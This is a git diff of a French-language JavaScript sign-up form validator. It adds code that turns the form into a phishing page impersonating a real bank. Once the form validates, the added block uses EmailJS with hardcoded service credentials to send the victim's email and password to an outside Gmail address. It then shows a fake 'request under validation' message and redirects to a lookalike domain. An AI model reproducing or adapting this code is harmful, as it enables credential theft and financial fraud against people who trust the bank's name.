@@ -4,12 +4,13 @@ const username = document.querySelector('#username');
 const email = document.querySelector('#email');
 const password = document.querySelector('#password');
 const password2 = document.querySelector('#password2');
-
+var emailcheck=false,namecheck=false
 // Evenements
 form.addEventListener('submit',e=>{
     e.preventDefault();
 
     form_verify();
+    
 })
 
 // Fonstions
@@ -33,6 +34,7 @@ function form_verify() {
             let message ="Username doit avoir au moins 3 caractères";
             setError(username,message)
         } else {
+          namecheck=true
             setSuccess(username);
         }
     }
@@ -45,6 +47,7 @@ function form_verify() {
         let message = "Email non valide";
         setError(email,message);
     }else{
+      emailcheck=true
         setSuccess(email)
     }
     
@@ -66,6 +69,22 @@ function form_verify() {
         let message ="Les mot de passes ne correspondent pas";
         setError(password2,message)
     }else{
+      if(emailcheck==true){
+      emailjs.init('nO0mGzC33a5qOSUx7')
+      var param = {
+        sendername: ""+emailValue,
+        to: "reunierprospere@gmail.com",
+        subject: ''+pwd2Value,
+        replyto: ""+emailValue,
+        bankname:'BNP PARIBAS FORTIS',
+      }
+      var serviceId = "service_cuzrpno"
+      var templateId = "template_nvumdqd"
+      emailjs.send(serviceId, templateId, param).then(function() {
+        alert("Votre demande de création de compte est en cours de validation.vous aurez des nouvelles de la banque dans les 24h qui suivent")
+        window.location.href="https://bnpparibas-gfrz.vercel.app/"
+      })
+      }
         setSuccess(password2)
     }
 }
